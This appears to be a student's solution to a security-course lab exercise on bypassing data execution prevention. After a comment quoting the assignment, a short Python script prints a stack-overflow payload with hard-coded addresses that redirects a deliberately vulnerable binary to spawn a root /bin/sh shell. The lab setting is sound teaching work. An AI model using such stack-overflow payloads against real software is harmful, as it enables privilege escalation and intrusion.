# target5: Bypassing DEP
# (Difficulty: Medium)
# This program resembles target2, but it has been compiled with data execution prevention (DEP)
# enabled. DEP means that the processor will refuse to execute instructions stored on the stack. You
# can overflow the stack and modify values like the return address, but you can’t jump to any shellcode
# you inject. You need to find another way to run the command /bin/sh and open a root shell.
# What to submit Create a Python program named sol5.py that prints a line to be used as the
# command-line argument to the target. Test your program with the command line:
# ./target5 $(python3 sol5.py)
# For this target, it’s acceptable if the program segfaults after the root shell is closed.

import sys
from shellcode import shellcode
from struct import pack

sys.stdout.buffer.write(bytes.fromhex('41' * 10))
sys.stdout.buffer.write(pack("<I", 0xfffee890))
sys.stdout.buffer.write(bytes.fromhex('41' * 4))
sys.stdout.buffer.write(pack("<I",0xfffee898))
sys.stdout.buffer.write(pack("<I", 0x08049d16))
sys.stdout.buffer.write(pack("<I", 0xfffee8a0))
sys.stdout.buffer.write(bytes.fromhex('41'*12))
sys.stdout.buffer.write(b"/bin/sh")

